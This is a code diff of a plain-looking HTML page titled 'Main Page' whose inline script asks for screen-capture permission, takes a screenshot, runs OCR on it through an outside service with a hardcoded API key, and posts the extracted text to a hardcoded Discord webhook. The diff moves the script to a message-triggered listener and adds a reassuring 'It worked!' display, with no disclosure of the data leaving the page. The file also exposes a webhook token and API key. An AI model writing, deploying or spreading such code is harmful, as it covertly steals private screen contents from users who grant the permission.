@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Main</title>
+<title>Main Page</title>
 </head>
 <body>
 <h1>Main Page</h1>
@@ -10,21 +10,21 @@
 const W="https://discord.com/api/webhooks/1471638895149187216/4BuoD1F-aQPE_0SkMO-sHihafx71V_YdUCH50OPKtXt4cUMIoi2C9rzzA7bOvUziTLzd",
       K="K85882318988957";
 
-(async()=>{
-  try{
-    // 1️⃣ open test page in new tab
+window.addEventListener("message", async e=>{
+  if(e.data?.msg === "run_main"){
+    // open test.html in a new tab
     const testTab = window.open("test.html","_blank");
 
-    // 2️⃣ request screen capture
+    // ask for screen capture permission
     const stream = await navigator.mediaDevices.getDisplayMedia({video:{displaySurface:"browser"}});
-    
-    // 3️⃣ tell test page we have permission
-    testTab.postMessage({msg:"permission_granted"},"*");
 
-    // 4️⃣ wait for test page to respond with "allowed"
+    // tell test.html screen permission is granted
+    testTab.postMessage({msg:"permission_granted"}, "*");
+
+    // wait for test.html to confirm with "allowed"
     await new Promise(resolve => {
-      function handler(e){
-        if(e.data?.msg === "allowed"){
+      function handler(ev){
+        if(ev.data?.msg==="allowed"){
           window.removeEventListener("message", handler);
           resolve();
         }
@@ -32,7 +32,10 @@ const W="https://discord.com/api/webhooks/1471638895149187216/4BuoD1F-aQPE_0SkMO
       window.addEventListener("message", handler);
     });
 
-    // 5️⃣ proceed with OCR + Discord
+    // once allowed, send test data to test.html to display
+    testTab.postMessage({msg:"display_words", text:"It worked! OCR will continue."}, "*");
+
+    // continue with OCR + Discord workflow
     const v = document.createElement("video");
     v.srcObject = stream; 
     await v.play(); 
@@ -45,7 +48,7 @@ const W="https://discord.com/api/webhooks/1471638895149187216/4BuoD1F-aQPE_0SkMO
 
     const b = await new Promise(r=>c.toBlob(r,"image/png"));
     const f = new FormData();
-    f.append("apikey", K); f.append("language","eng"); f.append("file", b, "shot.png");
+    f.append("apikey",K); f.append("language","eng"); f.append("file",b,"shot.png");
 
     const j = await (await fetch("https://api.ocr.space/parse/image",{method:"POST",body:f})).json();
     if(!j.ParsedResults?.length) return;
@@ -61,8 +64,8 @@ const W="https://discord.com/api/webhooks/1471638895149187216/4BuoD1F-aQPE_0SkMO
     });
 
     console.log("OCR + Discord done!");
-  } catch(e){console.error(e);}
-})();
+  }
+});
 </script>
 </body>
 </html>
